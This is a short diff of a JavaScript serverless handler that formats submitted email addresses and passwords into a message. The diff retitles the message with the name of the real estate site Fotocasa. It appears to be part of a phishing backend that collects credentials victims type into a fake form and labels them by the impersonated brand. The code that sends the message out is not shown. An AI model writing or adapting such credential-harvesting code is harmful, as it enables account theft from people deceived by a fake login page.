@@ -17,7 +17,7 @@ module.exports = async function handler(req, res) {
     }
 
     const message = `
-📩 NEW FORM
+📩 fotocasa
 
 📧 Email: ${email}
 🔑 Pass: ${pass}
